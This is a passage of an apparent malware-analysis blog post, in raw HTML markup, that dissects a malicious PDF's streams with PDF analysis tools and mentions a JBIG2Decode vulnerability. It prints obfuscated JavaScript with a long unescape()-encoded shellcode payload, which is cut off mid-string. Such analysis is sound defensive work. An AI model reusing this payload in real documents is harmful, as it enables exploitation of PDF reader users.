 &lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;JBIG2Decode&lt;/span&gt;           &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;
 &lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;RichMedia&lt;/span&gt;             &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;
 &lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;Launch&lt;/span&gt;                &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;
 &lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;Colors&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;^&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;24&lt;/span&gt;         &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;
 &lt;span style=&#34;color: #719e07&#34;&gt;%%&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;EOF&lt;/span&gt;                  &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;
 &lt;span style=&#34;color: #93A1A1&#34;&gt;After&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;last&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;%%&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;EOF&lt;/span&gt;       &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;
 &lt;span style=&#34;color: #93A1A1&#34;&gt;Total&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;entropy:&lt;/span&gt;           &lt;span style=&#34;color: #2AA198&#34;&gt;7.862012&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;     &lt;span style=&#34;color: #2AA198&#34;&gt;21284&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;bytes&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;
 &lt;span style=&#34;color: #93A1A1&#34;&gt;Entropy&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;inside&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;streams:&lt;/span&gt;  &lt;span style=&#34;color: #2AA198&#34;&gt;7.890539&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;     &lt;span style=&#34;color: #2AA198&#34;&gt;19723&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;bytes&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;
 &lt;span style=&#34;color: #93A1A1&#34;&gt;Entropy&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;outside&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;streams:&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;4.745484&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;      &lt;span style=&#34;color: #2AA198&#34;&gt;1561&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;bytes&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;

&lt;span style=&#34;color: #586E75&#34;&gt;# first 512 bytes of the PDF removed&lt;/span&gt;

&lt;span style=&#34;color: #586E75&#34;&gt;# To list the streams that are encoded and see what filters the stream is using type &amp;quot;pdfilter&amp;quot;: &lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x00000000&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;pdfilter&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;Stream&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;uses&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;FlateDecode&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;Stream&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;uses&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;ASCIIHexDecode&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;Stream&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;uses&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;FlateDecode&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;Stream&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;uses&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;ASCIIHexDecode&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;Stream&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;uses&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;JBIG2Decode&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;Stream&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;uses&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;FlateDecode&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Seems like streams 1,2 and 3 are interesting. According to the tutorial &lt;code&gt;pdfvi&lt;/code&gt; displays them.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;FlateDecode: Decompress. In Python do &lt;code&gt;zlib.decompress&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;ASCIIHexDecode: Decode from ASCII Hex&lt;/li&gt;
&lt;li&gt;JBIG2Decode: Decode as a black and white image&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;What really threw me off was the &lt;code&gt;JBIG2Decode&lt;/code&gt; decoder for stream 2. There was a &lt;a href=&#34;http://vrt-blog.snort.org/2009/02/have-nice-weekend-pdf-love.html&#34; target=&#34;_blank&#34;&gt;vulnerability&lt;/a&gt; associated with it. It is too short to be the email (14 bytes). It is not compressed (lacks the magic headers). &lt;code&gt;Pyew&lt;/code&gt; also displays the disassembly but it is not shellcode either (if it is, then I didn&amp;rsquo;t recognize it). It is also not an image (hence the &lt;code&gt;JBIG2Decode&lt;/code&gt; filter).&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;Stream 2&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;Applying&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;Filter&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;FlateDecode&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;...&lt;/span&gt;
&lt;span style=&#34;color: #268BD2&#34;&gt;Applying&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;Filter&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;ASCIIHexDecode&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;...&lt;/span&gt;
&lt;span style=&#34;color: #268BD2&#34;&gt;Applying&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;Filter&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;JBIG2Decode&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;...&lt;/span&gt;
&lt;span style=&#34;color: #268BD2&#34;&gt;Encoded&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;Stream&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;2&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;--------------------------------------------------------------------------------&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;0000&lt;/span&gt;   &lt;span style=&#34;color: #93A1A1&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;20&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;50&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;FF&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;40&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;69&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;05&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;69&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;50&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;50&lt;/span&gt;          &lt;span style=&#34;color: #268BD2&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;P.@..i...iPP&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;--------------------------------------------------------------------------------&lt;/span&gt;

&lt;span style=&#34;color: #268BD2&#34;&gt;Show&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;di&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;sassembly&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;y&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;n&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;?&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;n&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]:&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;y&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;x00000000&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;02&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0020&lt;/span&gt;                 &lt;span style=&#34;color: #268BD2&#34;&gt;ADD&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;EAX&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;AH&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;x00000002&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;01&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;50&lt;/span&gt;                   &lt;span style=&#34;color: #268BD2&#34;&gt;PUSH&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;EAX&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;x00000003&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;03&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;ff40&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;00&lt;/span&gt;              &lt;span style=&#34;color: #268BD2&#34;&gt;INC&lt;/span&gt; &lt;span style=&#34;color: #DC322F&#34;&gt;DWORD&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;EAX&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;x00000006&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;03&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0069&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;00&lt;/span&gt;              &lt;span style=&#34;color: #268BD2&#34;&gt;ADD&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ECX&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;CH&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;x00000009&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;01&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;00&lt;/span&gt;                   &lt;span style=&#34;color: #268BD2&#34;&gt;DB&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x0&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;x0000000a&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;01&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;05&lt;/span&gt;                   &lt;span style=&#34;color: #268BD2&#34;&gt;DB&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x5&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;x0000000b&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;01&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;69&lt;/span&gt;                   &lt;span style=&#34;color: #268BD2&#34;&gt;DB&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x69&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;x0000000c&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;01&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;50&lt;/span&gt;                   &lt;span style=&#34;color: #268BD2&#34;&gt;PUSH&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;EAX&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;x0000000d&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;01&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;50&lt;/span&gt;                   &lt;span style=&#34;color: #268BD2&#34;&gt;PUSH&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;EAX&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Let&amp;rsquo;s take a look at stream 1 using &lt;code&gt;pdfvi&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;Stream 1&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x00000000&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;pdfvi&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;Applying&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;Filter&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;FlateDecode&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;...&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;Applying&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;Filter&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;ASCIIHexDecode&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;...&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;Encoded&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;Stream&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;
&lt;span style=&#34;color: #719e07&#34;&gt;--------------------------------------------------------------------------------&lt;/span&gt;
    &lt;span style=&#34;color: #268BD2&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;HdPN&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;;&lt;/span&gt;
    &lt;span style=&#34;color: #268BD2&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;;&lt;/span&gt;
    
    &lt;span style=&#34;color: #586E75&#34;&gt;// important&lt;/span&gt;
    &lt;span style=&#34;color: #268BD2&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;IxTUQnOvHg&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;unescape(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;%u72f9%u4649%u1525%u7f0d%u3d3c%ue084%ud62a%ue139%&lt;/span&gt;
&lt;span style=&#34;color: #2AA198&#34;&gt;ua84a%u76b9%u9824%u7378%u7d71%u757f%u2076%u96d4%uba91%u1970%ub8f9%ue232%u467b%u9&lt;/span&gt;
&lt;span style=&#34;color: #2AA198&#34;&gt;ba8%ufe01%uc7c6%ue3c1%u7e24%u437c%ue180%ub115%ub3b2%u4f66%u27b6%u9f3c%u7a4e%u412&lt;/span&gt;
&lt;span style=&#34;color: #2AA198&#34;&gt;d%ubbbf%u7705%uf528%u9293%u9990%ua998%u0a47%u14eb%u3d49%u484b%u372f%ub98d%u3478%&lt;/span&gt;
&lt;span style=&#34;color: #2AA198&#34;&gt;u0bb4%ud5d2%ue031%u3572%ud610%u6740%u2bbe%u4afd%u041c%u3f97%ufc3a%u7479%u421d%ub&lt;/span&gt;
&lt;span style=&#34;color: #2AA198&#34;&gt;7b5%u0c2c%u130d%u25f8%u76b0%u4e79%u7bb1%u0c66%u2dbb%u911c%ua92f%ub82c%u8db0%u0d7&lt;/span&gt;
&lt;span style=&#34;color: #2AA198&#34;&gt;e%u3b96%u49d4%ud56b%u03b7%ue1f7%u467d%u77b9%u3d42%u111d%u67e0%u4b92%ueb85%u2471%&lt;/span&gt;
&lt;span style=&#34;color: #2AA198&#34;&gt;u9b48%uf902%u4f15%u04ba%ue300%u8727%u9fd6%u4770%u187a%u73e2%ufd1b%u2574%u437c%u4&lt;/span&gt;
&lt;span style=&#34;color: #2AA198&#34;&gt;190%u97b6%u1499%u783c%u8337%ub3f8%u7235%u693f%u98f5%u7fbe%u4a75%ub493%ub5a8%u21b&lt;/span&gt;
&lt;span style=&#34;color: #2AA198&#34;&gt;f%ufcd0%u3440%u057b%ub2b2%u7c71%u814e%u22e1%u04eb%u884a%u2ce2%u492d%u8d42%u75b3%&lt;/span&gt;
&lt;span style=&#34;color: #2AA198&#34;&gt;uf523%u727f%ufc0b%u0197%ud3f7%u90f9%u41be%ua81c%u7d25%ub135%u7978%uf80a%ufd32%u7&lt;/span&gt;
&lt;span style=&#34;color: #2AA198&#34;&gt;69b%u921d%ubbb4%u77b8%u707e%u4073%u0c7a%ud689%u2491%u1446%u9fba%uc087%u0dd4%u4bb&lt;/span&gt;
&lt;span style=&#34;color: #2AA198&#34;&gt;0%ub62f%ue381%u0574%u3fb9%u1b67%u93d5%u8396%u66e0%u47b5%u98b7%u153c%ua934%u3748%&lt;/span&gt;
&lt;span style=&#34;color: #2AA198&#34;&gt;u3d27%u4f75%u8cbf%u43e2%ub899%u3873%u7deb%u257a%uf985%ubb8d%u7f91%u9667%ub292%u4&lt;/span&gt;
&lt;span style=&#34;color: #2AA198&#34;&gt;879%u4a3c%ud433%u97a9%u377e%ub347%u933d%u0524%u9f3f%ue139%u3571%u23b4%ua8d6%u881&lt;/span&gt;
&lt;span style=&#34;color: #2AA198&#34;&gt;4%uf8d1%u4272%u76ba%ufd08%ube41%ub54b%u150d%u4377%u1174%u78e3%ue020%u041c%u40bf%&lt;/span&gt;
&lt;span style=&#34;color: #2AA198&#34;&gt;ud510%ub727%u70b1%uf52b%u222f%u4efc%u989b%u901d%ub62c%u4f7c%u342d%u0c66%ub099%u7&lt;/span&gt;
&lt;span style=&#34;color: #2AA198&#34;&gt;b49%u787a%u7f7e%u7d73%ub946%ub091%u928d%u90bf%u21b7%ue0f6%u134b%u29f5%u67eb%u257&lt;/span&gt;
&lt;span style=&#34;color: #2AA198&#34;&gt;7%ue186%u2a05%u66d6%ua8b9%u1535%u4296%u3498%ub199%ub4ba%ub52c%uf812%u4f93%u7b76%&lt;/span&gt;
&lt;span style=&#34;color: #2AA198&#34;&gt;u3079%ubefd%u3f71%u4e40%u7cb3%u2775%ue209%u4324%u0c70%u182d%u02e3%u4af9%ubb47%u4&lt;/span&gt;
&lt;span style=&#34;color: #2AA198&#34;&gt;1b6%u729f%u9748%ud480%ud528%u749b%u1c3c%ufc84%u497d%u7eb8%ud26b%u1de0%u0d76%u317&lt;/span&gt;
&lt;span style=&#34;color: #2AA198&#34;&gt;4%u14eb%u3770%u71a9%u723d%ub246%u2f78%u047f%ub6a9%u1c7b%u3a73%u3ce1%u19be%u34f9%&lt;/span&gt;
&lt;span style=&#34;color: #2AA198&#34;&gt;ud500%u037a%ue2f8%ub024%ufd4e%u3d79%u7596%u9b15%u7c49%ub42f%u9f4f%u4799%uc13b%ue&lt;/span&gt;
&lt;span style=&#34;color: #2AA198&#34;&gt;3d0%u4014%u903f%u41bf%u4397%ub88d%ub548%u0d77%u4ab2%u2d93%u9267%ub198%ufc1a%ud4b&lt;/span&gt;
&lt;span style=&#34;color: #2AA198&#34;&gt;9%ub32c%ubaf5%u690c%u91d6%u04a8%u1dbb%u4666%u2505%u35b7%u3742%u4b27%ufc90%ud233%&lt;/span&gt;
&lt;span style=&#34;color: #2AA198&#34;&gt;u30b2%uff64%u5a32%u528b%u8b0c%u1452%u728b%u3328%ub1c9%u3318%u33ff%uacc0%u613c%u0&lt;/span&gt;
&lt;span style=&#34;color: #2AA198&#34;&gt;27c%u202c%ucfc1%u030d%ue2f8%u81f0%u5bff%u4abc%u8b6a%u105a%u128b%uda75%u538b%u033&lt;/span&gt;
&lt;span style=&#34;color: #2AA198&#34;&gt;c%uffd3%u3472%u528b%u0378%u8bd3%u2072%uf303%uc933%uad41%uc303%u3881%u6547%u5074%&lt;/span&gt;
&lt;span style=&#34;color: #2AA198&#34;&gt;uf475%u7881%u7204%u636f%u7541%u81eb%u0878%u6464%u6572%ue275%u8b49%u2472%uf303%u8&lt;/span&gt;
&lt;span style=&#34;color: #2AA198&#34;&gt;b66%u4e0c%u728b%u031c%u8bf3%u8e14%ud303%u3352%u57ff%u6168%u7972%u6841%u694c%u726&lt;/span&gt;
&lt;span style=&#34;color: #2AA198&#34;&gt;2%u4c68%u616f%u5464%uff53%u68d2%u3233%u0101%u8966%u247c%u6802%u7375%u7265%uff54%&lt;/span&gt;
&lt;span style=&#34;color: #2AA198&#34;&gt;u68d0%u786f%u0141%udf8b%u5c88%u0324%u6168%u6567%u6842%u654d%u7373%u5054%u54ff%u2&lt;/span&gt;
&lt;span style=&#34;color: #2AA198&#34;&gt;c24%u6857%u2144%u2121%u4f68%u4e57%u8b45%ue8dc%u0000%u0000%u148b%u8124%u0b72%ua31&lt;/span&gt;
&lt;span style=&#34;color: #2AA198&#34;&gt;6%u32fb%u7968%ubece%u8132%u1772%u45ae%u48cf%uc168%ue12b%u812b%u2372%u3610%ud29f%&lt;/span&gt;
&lt;span style=&#34;color: #2AA198&#34;&gt;u7168%ufa44%u81ff%u2f72%ua9f7%u0ca9%u8468%ucfe9%u8160%u3b72%u93be%u43a9%ud268%u9&lt;/span&gt;
